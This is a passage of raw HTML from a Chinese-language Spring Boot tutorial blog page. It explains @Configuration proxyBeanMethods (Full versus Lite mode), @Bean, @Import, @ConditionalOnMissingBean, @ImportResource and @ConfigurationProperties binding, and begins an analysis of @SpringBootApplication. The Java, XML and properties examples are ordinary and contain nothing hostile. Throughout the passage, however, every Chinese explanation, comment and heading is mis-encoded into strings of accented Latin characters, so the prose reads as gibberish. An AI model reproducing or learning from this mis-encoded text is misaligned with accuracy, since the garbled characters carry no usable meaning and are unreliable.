class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 1ã€é…ç½®ç±»é‡Œé¢ä½¿ç”¨<span class="hljs-doctag">@Bean</span>æ ‡æ³¨åœ¨æ–¹æ³•ä¸Šç»™å®¹å™¨æ³¨å†Œç»„ä»¶ï¼Œé»˜è®¤ä¹Ÿæ˜¯å•å®ä¾‹çš„</span><br><span class="hljs-comment"> * 2ã€é…ç½®ç±»æœ¬èº«ä¹Ÿæ˜¯ç»„ä»¶</span><br><span class="hljs-comment"> * 3ã€proxyBeanMethodsï¼šä»£ç†beançš„æ–¹æ³•</span><br><span class="hljs-comment"> *      Full(proxyBeanMethods = true)ï¼ˆä¿è¯æ¯ä¸ª<span class="hljs-doctag">@Bean</span>æ–¹æ³•è¢«è°ƒç”¨å¤šå°‘æ¬¡è¿”å›çš„ç»„ä»¶éƒ½æ˜¯å•å®ä¾‹çš„ï¼‰ï¼ˆé»˜è®¤ï¼‰</span><br><span class="hljs-comment"> *      Lite(proxyBeanMethods = false)ï¼ˆæ¯ä¸ª<span class="hljs-doctag">@Bean</span>æ–¹æ³•è¢«è°ƒç”¨å¤šå°‘æ¬¡è¿”å›çš„ç»„ä»¶éƒ½æ˜¯æ–°åˆ›å»ºçš„ï¼‰</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span> <span class="hljs-comment">//å‘Šè¯‰SpringBootè¿™æ˜¯ä¸€ä¸ªé…ç½®ç±» == é…ç½®æ–‡ä»¶</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyConfig</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Full:å¤–éƒ¨æ— è®ºå¯¹é…ç½®ç±»ä¸­çš„è¿™ä¸ªç»„ä»¶æ³¨å†Œæ–¹æ³•è°ƒç”¨å¤šå°‘æ¬¡è·å–çš„éƒ½æ˜¯ä¹‹å‰æ³¨å†Œå®¹å™¨ä¸­çš„å•å®ä¾‹å¯¹è±¡</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Bean</span> <span class="hljs-comment">//ç»™å®¹å™¨ä¸­æ·»åŠ ç»„ä»¶ã€‚ä»¥æ–¹æ³•åä½œä¸ºç»„ä»¶çš„idã€‚è¿”å›ç±»å‹å°±æ˜¯ç»„ä»¶ç±»å‹ã€‚è¿”å›çš„å€¼ï¼Œå°±æ˜¯ç»„ä»¶åœ¨å®¹å™¨ä¸­çš„å®ä¾‹</span><br>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">user01</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">zhangsan</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;zhangsan&quot;</span>, <span class="hljs-number">18</span>);<br>        <span class="hljs-comment">//userç»„ä»¶ä¾èµ–äº†Petç»„ä»¶</span><br>        zhangsan.setPet(tomcatPet());<br>        <span class="hljs-keyword">return</span> zhangsan;<br>    &#125;<br><br>    <span class="hljs-meta">@Bean(&quot;tom&quot;)</span><br>    <span class="hljs-keyword">public</span> Pet <span class="hljs-title function_">tomcatPet</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pet</span>(<span class="hljs-string">&quot;tomcat&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>@Configurationæµ‹è¯•ä»£ç å¦‚ä¸‹:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SpringBootConfiguration</span><br><span class="hljs-meta">@EnableAutoConfiguration</span><br><span class="hljs-meta">@ComponentScan(&quot;com.atguigu.boot&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-comment">//1ã€è¿”å›æˆ‘ä»¬IOCå®¹å™¨</span><br>        <span class="hljs-type">ConfigurableApplicationContext</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> SpringApplication.run(MainApplication.class, args);<br><br>    <span class="hljs-comment">//2ã€æŸ¥çœ‹å®¹å™¨é‡Œé¢çš„ç»„ä»¶</span><br>        String[] names = run.getBeanDefinitionNames();<br>        <span class="hljs-keyword">for</span> (String name : names) &#123;<br>            System.out.println(name);<br>        &#125;<br><br>    <span class="hljs-comment">//3ã€ä»å®¹å™¨ä¸­è·å–ç»„ä»¶</span><br>        <span class="hljs-type">Pet</span> <span class="hljs-variable">tom01</span> <span class="hljs-operator">=</span> run.getBean(<span class="hljs-string">&quot;tom&quot;</span>, Pet.class);<br>        <span class="hljs-type">Pet</span> <span class="hljs-variable">tom02</span> <span class="hljs-operator">=</span> run.getBean(<span class="hljs-string">&quot;tom&quot;</span>, Pet.class);<br>        System.out.println(<span class="hljs-string">&quot;ç»„ä»¶ï¼š&quot;</span>+(tom01 == tom02));<br><br>    <span class="hljs-comment">//4ã€com.atguigu.boot.config.MyConfig$$EnhancerBySpringCGLIB$$51f1e1ca@1654a892</span><br>        <span class="hljs-type">MyConfig</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> run.getBean(MyConfig.class);<br>        System.out.println(bean);<br><br>    <span class="hljs-comment">//å¦‚æœ@Configuration(proxyBeanMethods = true)ä»£ç†å¯¹è±¡è°ƒç”¨æ–¹æ³•ã€‚SpringBootæ€»ä¼šæ£€æŸ¥è¿™ä¸ªç»„ä»¶æ˜¯å¦åœ¨å®¹å™¨ä¸­æœ‰ã€‚</span><br>        <span class="hljs-comment">//ä¿æŒç»„ä»¶å•å®ä¾‹</span><br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> bean.user01();<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user1</span> <span class="hljs-operator">=</span> bean.user01();<br>        System.out.println(user == user1);<br><br>        <span class="hljs-type">User</span> <span class="hljs-variable">user01</span> <span class="hljs-operator">=</span> run.getBean(<span class="hljs-string">&quot;user01&quot;</span>, User.class);<br>        <span class="hljs-type">Pet</span> <span class="hljs-variable">tom</span> <span class="hljs-operator">=</span> run.getBean(<span class="hljs-string">&quot;tom&quot;</span>, Pet.class);<br><br>        System.out.println(<span class="hljs-string">&quot;ç”¨æˆ·çš„å® ç‰©ï¼š&quot;</span>+(user01.getPet() == tom));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æœ€ä½³å®æˆ˜<ul><li>é…ç½® ç±»ç»„ä»¶ä¹‹é—´<strong>æ— ä¾èµ–å…³ç³»</strong>ç”¨Liteæ¨¡å¼åŠ é€Ÿå®¹å™¨å¯åŠ¨è¿‡ç¨‹ï¼Œå‡å°‘åˆ¤æ–­</li><li>é…ç½® ç±»ç»„ä»¶ä¹‹é—´<strong>æœ‰ä¾èµ–å…³ç³»</strong>ï¼Œæ–¹æ³•ä¼šè¢«è°ƒç”¨å¾—åˆ°ä¹‹å‰å•å®ä¾‹ç»„ä»¶ï¼Œç”¨Fullæ¨¡å¼ï¼ˆé»˜è®¤ï¼‰</li></ul></li></ul><blockquote><p>lite è‹± [laÉªt]   ç¾ [laÉªt]<br>adj. ä½çƒ­é‡çš„ï¼Œæ¸…æ·¡çš„(lightçš„ä¸€ç§æ‹¼å†™æ–¹æ³•);ç±»ä¼¼â€¦çš„åŠ£è´¨å“</p></blockquote><hr><p>IDEAå¿«æ·é”®ï¼š</p><ul><li><code>Alt + Ins</code>:ç”Ÿæˆgetterï¼Œsetterã€æ„é€ å™¨ç­‰ä»£ç ã€‚</li><li><code>Ctrl + Alt + B</code>:æŸ¥çœ‹ç±»çš„å…·ä½“å®ç°ä»£ç ã€‚</li></ul><h2 id="09ã€åº•å±‚æ³¨è§£-Importå¯¼å…¥ç»„ä»¶"><a href="#09ã€åº•å±‚æ³¨è§£-Importå¯¼å…¥ç»„ä»¶" class="headerlink" title="09ã€åº•å±‚æ³¨è§£-@Importå¯¼å…¥ç»„ä»¶"></a>09ã€åº•å±‚æ³¨è§£-@Importå¯¼å…¥ç»„ä»¶</h2><p>@Beanã€@Componentã€@Controllerã€@Serviceã€@Repositoryï¼Œå®ƒä»¬æ˜¯Springçš„åŸºæœ¬æ ‡ç­¾ï¼Œåœ¨Spring Bootä¸­å¹¶æœªæ”¹å˜å®ƒä»¬åŸæ¥çš„åŠŸèƒ½ã€‚</p><p>@ComponentScan åœ¨<a href="#">07ã€åŸºç¡€å…¥é—¨-SpringBoot-è‡ªåŠ¨é…ç½®ç‰¹æ€§</a>æœ‰ç”¨ä¾‹ã€‚</p><p>@Import({User.class, DBHelper.class})ç»™å®¹å™¨ä¸­<strong>è‡ªåŠ¨åˆ›å»ºå‡ºè¿™ä¸¤ä¸ªç±»å‹çš„ç»„ä»¶</strong>ã€é»˜è®¤ç»„ä»¶çš„åå­—å°±æ˜¯å…¨ç±»å</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Import(&#123;User.class, DBHelper.class&#125;)</span><br><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span> <span class="hljs-comment">//å‘Šè¯‰SpringBootè¿™æ˜¯ä¸€ä¸ªé…ç½®ç±» == é…ç½®æ–‡ä»¶</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyConfig</span> &#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>æµ‹è¯•ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//1ã€è¿”å›æˆ‘ä»¬IOCå®¹å™¨</span><br><span class="hljs-type">ConfigurableApplicationContext</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> SpringApplication.run(MainApplication.class, args);<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">//5ã€è·å–ç»„ä»¶</span><br>String[] beanNamesForType = run.getBeanNamesForType(User.class);<br><br><span class="hljs-keyword">for</span> (String s : beanNamesForType) &#123;<br>    System.out.println(s);<br>&#125;<br><br><span class="hljs-type">DBHelper</span> <span class="hljs-variable">bean1</span> <span class="hljs-operator">=</span> run.getBean(DBHelper.class);<br>System.out.println(bean1);<br></code></pre></td></tr></table></figure><h2 id="10ã€åº•å±‚æ³¨è§£-Conditionalæ¡ä»¶è£…é…"><a href="#10ã€åº•å±‚æ³¨è§£-Conditionalæ¡ä»¶è£…é…" class="headerlink" title="10ã€åº•å±‚æ³¨è§£-@Conditionalæ¡ä»¶è£…é…"></a>10ã€åº•å±‚æ³¨è§£-@Conditionalæ¡ä»¶è£…é…</h2><p><strong>æ¡ä»¶è£…é…ï¼šæ»¡è¶³ConditionalæŒ‡å®šçš„æ¡ä»¶ï¼Œåˆ™è¿›è¡Œç»„ä»¶æ³¨å…¥</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205005453173.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç”¨@ConditionalOnMissingBeanä¸¾ä¾‹è¯´æ˜</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-meta">@ConditionalOnMissingBean(name = &quot;tom&quot;)</span><span class="hljs-comment">//æ²¡æœ‰tomåå­—çš„Beanæ—¶ï¼ŒMyConfigç±»çš„Beanæ‰èƒ½ç”Ÿæ•ˆã€‚</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyConfig</span> &#123;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">user01</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">zhangsan</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;zhangsan&quot;</span>, <span class="hljs-number">18</span>);<br>        zhangsan.setPet(tomcatPet());<br>        <span class="hljs-keyword">return</span> zhangsan;<br>    &#125;<br><br>    <span class="hljs-meta">@Bean(&quot;tom22&quot;)</span><br>    <span class="hljs-keyword">public</span> Pet <span class="hljs-title function_">tomcatPet</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pet</span>(<span class="hljs-string">&quot;tomcat&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-comment">//1ã€è¿”å›æˆ‘ä»¬IOCå®¹å™¨</span><br>    <span class="hljs-type">ConfigurableApplicationContext</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> SpringApplication.run(MainApplication.class, args);<br><br>    <span class="hljs-comment">//2ã€æŸ¥çœ‹å®¹å™¨é‡Œé¢çš„ç»„ä»¶</span><br>    String[] names = run.getBeanDefinitionNames();<br>    <span class="hljs-keyword">for</span> (String name : names) &#123;<br>        System.out.println(name);<br>    &#125;<br><br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">tom</span> <span class="hljs-operator">=</span> run.containsBean(<span class="hljs-string">&quot;tom&quot;</span>);<br>    System.out.println(<span class="hljs-string">&quot;å®¹å™¨ä¸­Tomç»„ä»¶ï¼š&quot;</span>+tom);<span class="hljs-comment">//false</span><br><br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">user01</span> <span class="hljs-operator">=</span> run.containsBean(<span class="hljs-string">&quot;user01&quot;</span>);<br>    System.out.println(<span class="hljs-string">&quot;å®¹å™¨ä¸­user01ç»„ä»¶ï¼š&quot;</span>+user01);<span class="hljs-comment">//true</span><br><br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">tom22</span> <span class="hljs-operator">=</span> run.containsBean(<span class="hljs-string">&quot;tom22&quot;</span>);<br>    System.out.println(<span class="hljs-string">&quot;å®¹å™¨ä¸­tom22ç»„ä»¶ï¼š&quot;</span>+tom22);<span class="hljs-comment">//true</span><br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="11ã€åº•å±‚æ³¨è§£-ImportResourceå¯¼å…¥Springé…ç½®æ–‡ä»¶"><a href="#11ã€åº•å±‚æ³¨è§£-ImportResourceå¯¼å…¥Springé…ç½®æ–‡ä»¶" class="headerlink" title="11ã€åº•å±‚æ³¨è§£-@ImportResourceå¯¼å…¥Springé…ç½®æ–‡ä»¶"></a>11ã€åº•å±‚æ³¨è§£-@ImportResourceå¯¼å…¥Springé…ç½®æ–‡ä»¶</h2><p>æ¯”å¦‚ï¼Œå…¬å¸ä½¿ç”¨bean.xmlæ–‡ä»¶ç”Ÿæˆé…ç½®beanï¼Œç„¶è€Œä½ ä¸ºäº†çœäº‹ï¼Œæƒ³ç»§ç»­å¤ç”¨bean.xmlï¼Œ@ImportResourceç²‰å¢¨ç™»åœºã€‚</p><p>bean.xmlï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">...</span>&quot;&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;haha&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.lun.boot.bean.User&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;zhangsan&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;age&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;18&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;hehe&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.lun.boot.bean.Pet&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;tomcat&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ImportResource(&quot;classpath:beans.xml&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyConfig</span> &#123;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>æµ‹è¯•ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-comment">//1ã€è¿”å›æˆ‘ä»¬IOCå®¹å™¨</span><br>    <span class="hljs-type">ConfigurableApplicationContext</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> SpringApplication.run(MainApplication.class, args);<br><br><span class="hljs-type">boolean</span> <span class="hljs-variable">haha</span> <span class="hljs-operator">=</span> run.containsBean(<span class="hljs-string">&quot;haha&quot;</span>);<br><span class="hljs-type">boolean</span> <span class="hljs-variable">hehe</span> <span class="hljs-operator">=</span> run.containsBean(<span class="hljs-string">&quot;hehe&quot;</span>);<br>System.out.println(<span class="hljs-string">&quot;hahaï¼š&quot;</span>+haha);<span class="hljs-comment">//true</span><br>System.out.println(<span class="hljs-string">&quot;heheï¼š&quot;</span>+hehe);<span class="hljs-comment">//true</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="12ã€åº•å±‚æ³¨è§£-ConfigurationPropertiesé…ç½®ç»‘å®š"><a href="#12ã€åº•å±‚æ³¨è§£-ConfigurationPropertiesé…ç½®ç»‘å®š" class="headerlink" title="12ã€åº•å±‚æ³¨è§£-@ConfigurationPropertiesé…ç½®ç»‘å®š"></a>12ã€åº•å±‚æ³¨è§£-@ConfigurationPropertiesé…ç½®ç»‘å®š</h2><p>å¦‚ä½•ä½¿ç”¨Javaè¯»å–åˆ°propertiesæ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œå¹¶ä¸”æŠŠå®ƒå°è£…åˆ°JavaBeanä¸­ï¼Œä»¥ä¾›éšæ—¶ä½¿ç”¨</p><p>ä¼ ç»Ÿæ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">getProperties</span> &#123;<br>     <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> FileNotFoundException, IOException &#123;<br>         <span class="hljs-type">Properties</span> <span class="hljs-variable">pps</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>         pps.load(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;a.properties&quot;</span>));<br>         <span class="hljs-type">Enumeration</span> <span class="hljs-variable">enum1</span> <span class="hljs-operator">=</span> pps.propertyNames();<span class="hljs-comment">//å¾—åˆ°é…ç½®æ–‡ä»¶çš„åå­—</span><br>         <span class="hljs-keyword">while</span>(enum1.hasMoreElements()) &#123;<br>             <span class="hljs-type">String</span> <span class="hljs-variable">strKey</span> <span class="hljs-operator">=</span> (String) enum1.nextElement();<br>             <span class="hljs-type">String</span> <span class="hljs-variable">strValue</span> <span class="hljs-operator">=</span> pps.getProperty(strKey);<br>             System.out.println(strKey + <span class="hljs-string">&quot;=&quot;</span> + strValue);<br>             <span class="hljs-comment">//å°è£…åˆ°JavaBeanã€‚</span><br>         &#125;<br>     &#125;<br> &#125;<br></code></pre></td></tr></table></figure><hr><p>Spring Bootä¸€ç§é…ç½®é…ç½®ç»‘å®šï¼š</p><p>@ConfigurationProperties + @Component</p><p>å‡è®¾æœ‰é…ç½®æ–‡ä»¶application.properties</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">mycar.brand</span>=<span class="hljs-string">BYD</span><br><span class="hljs-attr">mycar.price</span>=<span class="hljs-string">100000</span><br></code></pre></td></tr></table></figure><p>åªæœ‰åœ¨å®¹å™¨ä¸­çš„ç»„ä»¶ï¼Œæ‰ä¼šæ‹¥æœ‰SpringBootæä¾›çš„å¼ºå¤§åŠŸèƒ½</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@ConfigurationProperties(prefix = &quot;mycar&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Car</span> &#123;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><hr><p>Spring Bootå¦ä¸€ç§é…ç½®é…ç½®ç»‘å®šï¼š</p><p>@EnableConfigurationProperties + @ConfigurationProperties</p><ol><li>å¼€å¯Caré…ç½®ç»‘å®šåŠŸèƒ½</li><li>æŠŠè¿™ä¸ªCarè¿™ä¸ªç»„ä»¶è‡ªåŠ¨æ³¨å†Œåˆ°å®¹å™¨ä¸­</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@EnableConfigurationProperties(Car.class)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyConfig</span> &#123;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ConfigurationProperties(prefix = &quot;mycar&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Car</span> &#123;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="13ã€è‡ªåŠ¨é…ç½®ã€æºç åˆ†æã€‘-è‡ªåŠ¨åŒ…è§„åˆ™åŸç†"><a href="#13ã€è‡ªåŠ¨é…ç½®ã€æºç åˆ†æã€‘-è‡ªåŠ¨åŒ…è§„åˆ™åŸç†" class="headerlink" title="13ã€è‡ªåŠ¨é…ç½®ã€æºç åˆ†æã€‘-è‡ªåŠ¨åŒ…è§„åˆ™åŸç†"></a>13ã€è‡ªåŠ¨é…ç½®ã€æºç åˆ†æã€‘-è‡ªåŠ¨åŒ…è§„åˆ™åŸç†</h2><p>Spring Bootåº”ç”¨çš„å¯åŠ¨ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(MainApplication.class, args);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ†æä¸‹<code>@SpringBootApplication</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Target(ElementType.TYPE)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Documented</span><br><span class="hljs-meta">@Inherited</span><br><span class="hljs-meta">@SpringBootConfiguration</span><br><span class="hljs-meta">@EnableAutoConfiguration</span><br><span class="hljs-meta">@ComponentScan(</span><br><span class="hljs-meta">    excludeFilters = &#123;@Filter(</span><br><span class="hljs-meta">    type = FilterType.CUSTOM,</span><br><span class="hljs-meta">    classes = &#123;TypeExcludeFilter.class&#125;</span><br><span class="hljs-meta">), @Filter(</span><br><span 